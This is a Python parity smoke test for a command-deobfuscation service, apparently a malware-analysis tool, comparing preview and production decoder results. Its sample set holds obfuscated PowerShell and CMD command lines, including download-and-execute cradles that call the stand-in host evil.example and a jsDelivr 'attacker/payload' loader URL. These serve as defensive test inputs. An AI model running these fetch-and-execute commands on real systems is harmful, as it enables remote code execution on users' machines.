#!/usr/bin/env python3
"""
RC4.5 · Preview ↔ Production parity smoke test

Runs an identical set of decoder payloads against BOTH environments and
compares recipe / verdict / MITRE / IOC output. Use this to verify that a
Prod deploy is at RC4.5 parity with Preview before tagging the release.

Usage
-----
    ADMIN_PASSWORD='<prod-password>' \\
    PROD_URL='https://nivxray.nivxforge.com' \\
    PREVIEW_URL='https://greeting-app-5782.preview.emergentagent.com' \\
    python3 scripts/rc45_prev_prod_parity.py

Exit code
---------
    0 = all samples achieve parity (recipe length + verdict label match)
    1 = at least one sample diverges

The script prints a per-sample table:
    SAMPLE                          PREV(steps, verdict)   PROD(steps, verdict)   ✅/❌
"""

from __future__ import annotations

import base64
import json
import os
import sys
import time
from typing import Any

import requests


# ────────────────────────────────────────────────────────────────────
# Sample corpus — hits every RC4.x decoder path
# ────────────────────────────────────────────────────────────────────
def _mk_ps_encoded() -> str:
    inner = "$s='" + ";4<8;<86507869869869869861'" * 130 + "';iex $s"
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell.exe -e {b64}"


SAMPLES: dict[str, str] = {
    # Big-Whale-style PS -EncodedCommand (was Cloudflare 524 pre-hotfix)
    "morning_big_whale": _mk_ps_encoded(),
    # RC4.4 · CMD env-var substring (LOLBIN reconstruction)
    "rc44_cmd_envvar_substring": (
        "cmd /c set p=c_a_l_c_._e_x_e "
        "&& set p=%p:_=% && start %p%"
    ),
    # RC4.5 · PS backtick / line-continuation
    "rc45_ps_backtick": (
        "powershell -c \"IE`X (New-Ob`ject Net.WebCl`ient)"
        ".Downl`oadStr`ing('http://evil.example/pwn')\""
    ),
    # RC4.5 · PS alias normalization
    "rc45_ps_alias": (
        "powershell -c \"iwr -Uri http://evil.example/p.ps1 | iex\""
    ),
    # Classic PS -EncodedCommand (short form -e)
    "classic_ps_e_short": (
        "powershell.exe -e "
        + base64.b64encode(
            'Write-Host "hello world"'.encode("utf-16-le")
        ).decode()
    ),
    # T1105 legit CDN abuse (regression guard for mitre_map fix)
    "t1105_cdn_abuse": (
        "IEX ((New-Object Net.WebClient).DownloadString("
        "'https://cdn.jsdelivr.net/gh/attacker/payload/loader.ps1'))"
    ),
}


# ────────────────────────────────────────────────────────────────────
# Client helpers
# ────────────────────────────────────────────────────────────────────
def _login(url: str, email: str, password: str) -> str:
    r = requests.post(f"{url}/api/auth/login",
                      json={"email": email, "password": password},
                      timeout=30)
    r.raise_for_status()
    j = r.json()
    tok = j.get("access_token") or j.get("token")
    if not tok:
        raise RuntimeError(f"No token in login response: {j}")
    return tok


def _decode(url: str, tok: str, payload: str, budget_sec: float = 60.0) -> dict[str, Any]:
    t0 = time.time()
    try:
        r = requests.post(
            f"{url}/api/decode/smart",
            json={"input": payload},
            headers={"Authorization": f"Bearer {tok}"},
            timeout=budget_sec,
        )
    except requests.exceptions.Timeout:
        return {"error": f"TIMEOUT >{budget_sec}s", "elapsed": budget_sec}
    except requests.exceptions.RequestException as e:
        return {"error": f"{type(e).__name__}: {e}", "elapsed": time.time() - t0}
    elapsed = time.time() - t0
    if r.status_code != 200:
        return {"error": f"HTTP {r.status_code}: {r.text[:200]}", "elapsed": elapsed}
    j = r.json()
    return {
        "elapsed":  elapsed,
        "steps":    len(j.get("recipe") or []),
        "chain":    [s.get("op") for s in (j.get("recipe") or [])],
        "verdict":  (j.get("verdict_card") or {}).get("label") or "Unknown",
        "mitre":    sorted({m.get("id") for m in (j.get("mitre") or []) if isinstance(m, dict)}),
        "iocs":     j.get("iocs") or {},
        "output_len": len(str(j.get("output", ""))),
        "engine":   j.get("engine"),
    }


# ────────────────────────────────────────────────────────────────────
# Main
# ────────────────────────────────────────────────────────────────────
def main() -> int:
    preview_url = os.environ.get("PREVIEW_URL", "").rstrip("/")
    prod_url    = os.environ.get("PROD_URL", "").rstrip("/")
    email       = os.environ.get("ADMIN_EMAIL", "admin@nivxray.com")
    prev_pw     = os.environ.get("PREVIEW_PASSWORD") or os.environ.get("ADMIN_PASSWORD", "")
    prod_pw     = os.environ.get("PROD_PASSWORD") or os.environ.get("ADMIN_PASSWORD", "")

    if not preview_url or not prod_url:
        print("ERROR: set PREVIEW_URL and PROD_URL env vars", file=sys.stderr)
        return 2
    if not prev_pw or not prod_pw:
        print("ERROR: set ADMIN_PASSWORD (or PREVIEW_PASSWORD/PROD_PASSWORD)", file=sys.stderr)
        return 2

    print(f"PREVIEW: {preview_url}")
    print(f"PROD:    {prod_url}\n")

    try:
        prev_tok = _login(preview_url, email, prev_pw)
        prod_tok = _login(prod_url,    email, prod_pw)
    except Exception as e:
        print(f"FATAL: login failed → {e}", file=sys.stderr)
        return 3

    fmt = "{name:32} {prev:>28}   {prod:>28}   {mark}"
    print(fmt.format(name="SAMPLE", prev="PREVIEW (steps · verdict · t)", prod="PROD (steps · verdict · t)", mark=""))
    print("─" * 130)

    failures = 0
    report: dict[str, Any] = {}
    for name, payload in SAMPLES.items():
        p = _decode(preview_url, prev_tok, payload)
        q = _decode(prod_url,    prod_tok, payload)
        report[name] = {"preview": p, "prod": q}

        prev_desc = (
            f"ERR: {p['error']}" if "error" in p
            else f"{p['steps']} · {p['verdict']} · {p['elapsed']:.1f}s"
        )
        prod_desc = (
            f"ERR: {q['error']}" if "error" in q
            else f"{q['steps']} · {q['verdict']} · {q['elapsed']:.1f}s"
        )
        # Parity check — Prod must have the SAME (or higher) step count and
        # the SAME verdict label. Higher step count on Prod is fine (means
        # Prod has EVEN NEWER decoders); lower count = deploy lag.
        parity = (
            "error" not in p and "error" not in q
            and p["steps"] <= q["steps"]
            and p["verdict"] == q["verdict"]
        )
        mark = "✅" if parity else "❌"
        if not parity:
            failures += 1
        print(fmt.format(name=name, prev=prev_desc, prod=prod_desc, mark=mark))

    print("─" * 130)
    print(f"\nSUMMARY: {len(SAMPLES) - failures}/{len(SAMPLES)} samples at parity")
    out_path = os.environ.get("REPORT_JSON", "/tmp/rc45_parity_report.json")
    with open(out_path, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"Detailed report: {out_path}")
    return 0 if failures == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
